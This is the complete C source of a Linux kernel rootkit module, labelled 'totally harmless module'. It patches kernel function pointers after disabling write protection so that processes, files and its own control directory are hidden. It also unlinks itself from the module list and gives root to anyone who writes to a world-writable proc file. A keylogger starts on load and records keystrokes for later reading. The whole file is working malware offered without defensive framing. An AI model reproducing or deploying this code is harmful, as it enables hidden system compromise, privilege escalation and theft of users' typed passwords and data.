#include <linux/version.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>

#define CONTROL_DIR "harmless_file"
#define HIDE_MODULE_FILE "hide_module"
#define HIDE_PID_FILE "hide_pid"
#define HIDE_FILE_FILE "hide_file"
#define GIVE_ROOT_FILE "gimme_root"
#define KEYLOGGER_FILE "keylogger"
#define KEYLOGGER_LOG_SIZE 2048

#define MODULE_NAME "rootkit"


#define CR0_PAGE_WP 0x10000
#define INTERNAL_BUFFER_LEN 1024

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michal Antonczak");
MODULE_VERSION("0.1");
MODULE_DESCRIPTION("totally harmless module");


struct file_entry{
	char* name;
	struct list_head list;	

};

struct hooked_dir{
	char* name;
	int (*readdir)(struct file*, void*, filldir_t);
	struct file_operations* fops;

	struct list_head hidden_files_list;
	struct list_head list;

};

//retarded hack tbh
struct vfs_fops{
	struct file_operations* fops;
	int (*readdir)(struct file*, void*, filldir_t);
	struct list_head list;
	unsigned int refcount;

};
static int module_hidden;
static char* hide = "hide";
static char* show = "show";
static struct proc_dir_entry *proc_control=NULL;

static struct file_operations *procfs_fops=NULL;


static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);

static filldir_t kernel_filldir=NULL;
static filldir_t file_kernel_filldir=NULL;

static char internal_buffer[INTERNAL_BUFFER_LEN];
static char mydir[INTERNAL_BUFFER_LEN], myfile[INTERNAL_BUFFER_LEN];

static char param[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
static char filename[INTERNAL_BUFFER_LEN];

static struct list_head *module_prev=NULL ;

DEFINE_MUTEX(filldir_mutex);
static struct list_head *banned_files;


static struct notifier_block keylogger;
//meh
static char keylogger_log[KEYLOGGER_LOG_SIZE];
static int keylogger_log_len;
static int keylogger_on=0;

LIST_HEAD(hidden_pid_list);
LIST_HEAD(hooked_dir_list);
LIST_HEAD(vfs_fops_list);

static char* strdup(const char* str){
	char * tmp;
	tmp = kmalloc(strlen(str)+1, GFP_KERNEL);
	strcpy(tmp, str);
	return tmp;
}

static inline void disable_wp(void){
	write_cr0(read_cr0() & (~ CR0_PAGE_WP));
}

static inline void enable_wp(void){
	write_cr0(read_cr0() | CR0_PAGE_WP);

}


static  struct file_entry* create_file_entry(const char *name,struct list_head* head){

	struct file_entry* tmp=NULL;

	tmp = kmalloc(sizeof(struct file_entry), GFP_KERNEL);	

	if(tmp == NULL){
		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
		return NULL;
	}

	tmp->name = strdup(name);

	if( tmp->name == NULL){
		kfree(tmp);
		printk (KERN_INFO"%s: out of memory", MODULE_NAME);
		return NULL;
	}

	list_add( &tmp->list, head);

	return tmp;
}

static void delete_file_entry(struct file_entry* entry){
	list_del(&entry->list);
	kfree(entry->name);
	kfree(entry);
}

static struct file_entry*  find_file_entry(const char *name, struct list_head* head){
	struct file_entry* i;
	list_for_each_entry(i, head,list){
		if(!strcmp(name, i->name)){
			return i;
		}
	}
	return NULL;

}

static struct vfs_fops*  find_vfs_fops(struct file_operations* fops, struct list_head* head){
	struct vfs_fops* i;
	printk(KERN_INFO"find_vfs_fops for %p ", fops);
	list_for_each_entry(i, head,list){
		printk(KERN_INFO"entry %p , fops %p", i,i->fops);
		if( i->fops == fops){
			printk(KERN_INFO"find_vfs_fops returning");
			return i;
		}

	}
	return NULL;

}

static  struct vfs_fops* create_vfs_fops_entry(struct file_operations* fops
				       ,int (*new_readdir)(struct file*, void*, filldir_t)	
				       ,struct list_head* head){


	struct vfs_fops* tmp=NULL;

	tmp = find_vfs_fops(fops, &vfs_fops_list);

	if(tmp!=NULL){
		tmp->refcount++;
		return tmp;		
	}

	tmp = kmalloc(sizeof(struct vfs_fops), GFP_KERNEL);	

	if(tmp == NULL){
		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
		return NULL;
	}

	tmp ->readdir = fops->readdir;
	tmp->fops = fops;

	disable_wp();
		fops->readdir = new_readdir;
	enable_wp();

	tmp->refcount++;

	list_add( &tmp->list, head);

	return tmp;
}

static void _delete_vfs_fops(struct vfs_fops* entry){
	list_del(&entry->list);
	disable_wp();
		entry->fops->readdir= entry->readdir;
	enable_wp();
	kfree(entry);
}
static void free_vfs_fops(struct file_operations* fops,struct list_head* head){
	struct vfs_fops* tmp;
	tmp = find_vfs_fops(fops, head);	
	if(tmp !=NULL){
		tmp->refcount--;
		if(tmp->refcount == 0 ){
			_delete_vfs_fops(tmp);
		}

	}

}

static void delete_hooked_dir_entry(struct hooked_dir* entry){
	struct list_head* tmp;
	struct file_entry* f_entry;
	
	list_del(&entry->list);

	while(!list_empty(&entry->hidden_files_list)){
		tmp = entry->hidden_files_list.prev;		
		f_entry = list_entry(tmp , struct file_entry, list);
		delete_file_entry(f_entry);
	}	
		
	free_vfs_fops(entry->fops, &vfs_fops_list);

	kfree(entry->name);
	kfree(entry);
}

static struct hooked_dir* find_hooked_dir_entry(const char*name, struct list_head* head){

	struct hooked_dir* i;
	list_for_each_entry(i, head,list){
		if(!strcmp(name, i->name)){
			return i;
		}
	}

	return NULL;


}

static void clear_hooked_dirs(void){
	struct hooked_dir* dir_entry;
	struct list_head* tmp;
	while(!list_empty(&hooked_dir_list)){
		tmp = hooked_dir_list.prev;		
		dir_entry = list_entry(tmp , struct hooked_dir, list);
		delete_hooked_dir_entry(dir_entry);
	}	

}

static int file_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
	
	printk(KERN_INFO"file hider filldir");
	if(find_file_entry(name, banned_files) !=NULL){
		printk(KERN_INFO"hiding %s", name);
		return 0;
	}
	printk(KERN_INFO"showing %s", name);
	return file_kernel_filldir(buf,name,namelen,offset,ino, d_type);
}

static int file_hider(struct file* fp, void* d, filldir_t filldir){

	struct hooked_dir* hd;
	char *magic;
	int ret;
	struct vfs_fops* vf;

	magic = dentry_path_raw(fp->f_dentry,filename,INTERNAL_BUFFER_LEN);

	if(IS_ERR(magic)){
		printk(KERN_INFO"%s error retrieving dir name inc mess", MODULE_NAME);
		return -ENOTDIR;
	}
	printk(KERN_INFO"file hider called for %s", magic);

	hd = find_hooked_dir_entry(magic, &hooked_dir_list);
	
	if(hd == NULL){
		printk(KERN_INFO"hi there");
		vf = find_vfs_fops((struct file_operations*)fp->f_op, &vfs_fops_list);
		printk(KERN_INFO"%s hitting supersmart linux kernel calling %p", MODULE_NAME,vf->readdir);
		return vf->readdir(fp,d,filldir);
	}
	printk(KERN_INFO"directory covered");
	mutex_lock(&filldir_mutex);	
	file_kernel_filldir = filldir;
	banned_files = &hd -> hidden_files_list;
	ret =  hd->readdir(fp, d, file_filldir_hider);
	mutex_unlock(&filldir_mutex);
	printk(KERN_INFO"end of readdir");
	return ret;
}

static  struct hooked_dir* create_hooked_dir_entry(const char *name,struct list_head* head){

	struct hooked_dir* tmp=NULL;
	struct file* fp;
	struct vfs_fops* vp;

	tmp = kmalloc(sizeof(struct hooked_dir), GFP_KERNEL);	

	if(tmp == NULL){
		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
		return NULL;
	}

	tmp->name = strdup(name);

	if( tmp->name == NULL){
		kfree(tmp);
		printk (KERN_INFO"%s: out of memory", MODULE_NAME);
		return NULL;
	}

	fp = filp_open(name, O_RDONLY, 0);

	if(fp == NULL){
		printk(KERN_INFO"%s: failed opening file", MODULE_NAME);
		kfree(tmp->name);
		kfree(tmp);
		return NULL;
	}

	tmp->readdir = fp->f_op->readdir;
	tmp->fops= (struct file_operations*)fp->f_op;

	vp = create_vfs_fops_entry(tmp->fops, file_hider,&vfs_fops_list);	

	if(vp == NULL){
		printk(KERN_INFO"%s: failed  with vfs", MODULE_NAME);
		kfree(tmp->name);
		kfree(tmp);
		return NULL;
	}
	
	filp_close(fp,NULL);


	INIT_LIST_HEAD(&tmp->hidden_files_list);
	list_add( &tmp->list, head);

	return tmp;
}

static int proc_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
	
	if(!strncmp(name,CONTROL_DIR, strlen(CONTROL_DIR))){
		return 0;
	}

	if(find_file_entry(name, &hidden_pid_list) !=NULL){
		return 0;
	}

	return kernel_filldir(buf,name,namelen,offset,ino, d_type);
}

static int process_hider(struct file* fp, void* d, filldir_t filldir){
	kernel_filldir = filldir;
	return procfs_readdir_proc(fp, d, proc_filldir_hider);
}


/*
static int control_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	
		
	return count;
}

static int control_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
	
	printk(KERN_INFO"random write strncmp");
	return count;
}
*/

static int hide_file_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	
		
	return count;
}

static void hide_file(const char*dir, const char *name){
	struct hooked_dir* hd=NULL;
	struct file_entry* fe;
	hd = find_hooked_dir_entry(dir,&hooked_dir_list);

	if(hd == NULL){
		printk(KERN_INFO"creating hook for %s", dir);
		hd = create_hooked_dir_entry(dir,&hooked_dir_list);
		if ( hd == NULL){
			return;
		}
	}

	fe = find_file_entry(name, &hd->hidden_files_list);
	printk(KERN_INFO"hiding file %s", name);
	if(fe == NULL){
		printk(KERN_INFO"not yet hidden");
		fe = create_file_entry(name, &hd->hidden_files_list);
		printk(KERN_INFO"hidden");

		if(fe == NULL && list_empty(&hd->hidden_files_list)){
			printk(KERN_INFO"failed, cleaning hooks");
			delete_hooked_dir_entry(hd);
		}
	}

}

static void show_file(const char* dir, const char *name){

	struct hooked_dir* hd=NULL;
	struct file_entry* fe;
	hd = find_hooked_dir_entry(dir,&hooked_dir_list);

	if(hd == NULL){
			return;
	}

	fe = find_file_entry(name, &hd->hidden_files_list);

	if(fe != NULL){
		delete_file_entry(fe);

		if(list_empty(&hd->hidden_files_list)){
			delete_hooked_dir_entry(hd);
		}

	}

}

static int get_filendir(char *str, char* dirname, char *fname){
	int i ; 

	for(i = strlen(str); i>=0; i--){
		if(str[i]=='/'){
			str[i]=' ';
			break;
		}

	}
	return sscanf(str,"%s %s", dirname, fname) == 2 ; 
}


static int get_command(const char* input,char* cpybuf, char* cmd1, char* cmd2, unsigned long len){

	strncpy(cpybuf, input, min((len+1),(unsigned long) INTERNAL_BUFFER_LEN));
	cpybuf[min(len,(unsigned long ) INTERNAL_BUFFER_LEN)]=0;
	return sscanf(cpybuf, "%s %s", cmd1, cmd2) == 2;
}


static int hide_file_write(struct file* file, const char __user * buf, unsigned long count, void *data ){

	if(!get_command(buf,internal_buffer, command,param,count)){
		return count;
	}

	printk(KERN_INFO"received %s %s", command,param);
	if(!get_filendir(param,mydir, myfile)){
		return count;
	}	

	printk(KERN_INFO"processing %s in %s", mydir,myfile);

	if(!strcmp(command,hide)){
		printk(KERN_INFO"hide");
		hide_file(mydir,myfile);		
	}

	if(!strcmp(command,show)){
		printk(KERN_INFO"show");
		show_file(mydir,myfile);
	}

	return count;

}

static int pid_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){

	struct file_entry* tmp=NULL;

	if(!get_command(buf,internal_buffer, command,param,count)){
		return count;
	}
	
	if(!strcmp(command,hide)){

		if(find_file_entry(param, &hidden_pid_list) == NULL){
			tmp = create_file_entry(param,&hidden_pid_list);
		}

	}

	if(!strcmp(command,show)){

		tmp = find_file_entry(param, &hidden_pid_list);

		if(tmp!=NULL){
			delete_file_entry(tmp);
		}

	}

	return count;
}

static int pid_hide_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){

	return 0;
}


static int give_root_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
	struct cred* creds  = prepare_creds();
	creds->uid = 0;
	creds->gid =0 ;
	creds->euid = 0; 
	creds->egid = 0 ; 
	creds->fsuid = 0 ;
	creds->fsgid = 0 ;
	commit_creds(creds);

	return count;
}

static int module_hide_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	
		
	return count;
}

static void hide_module(void){

	if(module_hidden)
		return;

	
	//hide from /proc/modules
	module_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

		
	module_hidden=1;
}

static void show_module(void){

	if(!module_hidden)
		return;

	//add to /proc/modules
	list_add(&THIS_MODULE->list,module_prev);

	module_hidden=0;

}


static int module_hide_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
	if (count < 1){
		return count;
	}	

	if(buf[0] == '1'){
		hide_module();
	}
	if(buf[0] == '0'){
		show_module();
	}
	return count;
}

static struct proc_dir_entry* create_procfs_entry(const char* name, umode_t mode, struct proc_dir_entry* parent
		,int (*write_proc)(struct file*, const char __user *buf , unsigned long count, void *data)
		,int (*read_proc)(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data) ){

	static struct proc_dir_entry *tmp;
	//control dir setup
	tmp = create_proc_entry(name,mode ,parent);


	if( tmp == NULL){
		printk(KERN_INFO"cannot create entry %s", name);
		return NULL;	
	}

	if(write_proc!=NULL){
		tmp -> write_proc = write_proc;
	}

	if(read_proc!=NULL){
		tmp -> read_proc = read_proc;	
	}

	return tmp;

}

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){
	struct keyboard_notifier_param *param  = _param;
	char buf[128];
	int len;
	//so basically we are saving keysym into our procfs file
	//its worth to remember that the file size is limited
	//if we want to extract the characters pressed we should use some userspace tool
	if(code == KBD_KEYSYM){

		sprintf(buf, "%d, %u\n", param->down, param->value);
		len = strlen(buf);

		if(len + keylogger_log_len > KEYLOGGER_LOG_SIZE){
			memset(keylogger_log,0,  KEYLOGGER_LOG_SIZE);
			keylogger_log_len=0;
		}

		strcat(keylogger_log, buf);
		keylogger_log_len+=len;
		
	}

	return NOTIFY_OK;

}

static void disable_keylogger(void){
	if(!keylogger_on){
		return;
	}
	unregister_keyboard_notifier(&keylogger);	

	keylogger_on=0;

}

static void enable_keylogger(void){
	if(keylogger_on){
		return;
	}
	register_keyboard_notifier(&keylogger);
	keylogger_on=1;
}

static int keylogger_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
	
	if(count < 0 ){
		return count;
	}

	if(buf[0] ==  '0'){
		disable_keylogger();
	}

	if(buf[0] == '1'){
		enable_keylogger();
	}

	return count;
}

static int keylogger_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	
	int ret;

	if(off<keylogger_log_len){
		ret = min((int)(keylogger_log_len-off),count);
		memcpy(buffer, keylogger_log+off,ret);

	}else{
		ret =0 ;
	}	
			
	return ret;
}

static int control_init(void){


	proc_control = proc_mkdir(CONTROL_DIR, NULL); 

	if( proc_control == NULL ){
		return 0;	
	}
	create_procfs_entry(KEYLOGGER_FILE, 0666,proc_control,keylogger_write,keylogger_read);
	create_procfs_entry(HIDE_PID_FILE,0666,proc_control,pid_hide_write,pid_hide_read);
	create_procfs_entry(GIVE_ROOT_FILE, 0666,proc_control,give_root_write,NULL);
	create_procfs_entry(HIDE_MODULE_FILE, 0666, proc_control, module_hide_write, module_hide_read);
	create_procfs_entry(HIDE_FILE_FILE, 0666,proc_control, hide_file_write, hide_file_read);
	return 1; 
}

static void control_cleanup(void){
	remove_proc_entry(KEYLOGGER_FILE,proc_control);
	remove_proc_entry(HIDE_FILE_FILE, proc_control);
	remove_proc_entry(GIVE_ROOT_FILE,proc_control);
	remove_proc_entry(HIDE_MODULE_FILE,proc_control);
	remove_proc_entry(HIDE_PID_FILE, proc_control);
	remove_proc_entry(CONTROL_DIR,NULL);

}

static int proc_init(void){
	//setting up the control read write interface creating the file
	//and substituting the vfs functs for communication
	//its an easier and more flexible way than using ioctl

	struct proc_dir_entry *parent;


	parent = proc_control -> parent;
	procfs_fops = (struct file_operations *) parent->proc_fops;

	procfs_readdir_proc = procfs_fops -> readdir;
	

	disable_wp();
		procfs_fops -> readdir = process_hider;
	enable_wp();
	
	return 0; 
	
}

static void proc_cleanup(void){


	if(procfs_fops !=NULL){
		disable_wp();
			procfs_fops -> readdir = procfs_readdir_proc ;
		enable_wp();
	}

}


static void keylogger_init(void){
	keylogger.notifier_call = keylogger_notify ; 
	memset(keylogger_log,0,KEYLOGGER_LOG_SIZE);
	keylogger_log_len=0;
	enable_keylogger();

}

static void keylogger_cleanup(void){
	disable_keylogger();
}


static int __init m_init(void){
	keylogger_init();
	control_init();
	proc_init();
	return 0; 

}

static void __exit m_exit(void){
	keylogger_cleanup();
	clear_hooked_dirs();
	proc_cleanup();
	control_cleanup();
	return;
}

module_init(m_init);
module_exit(m_exit);
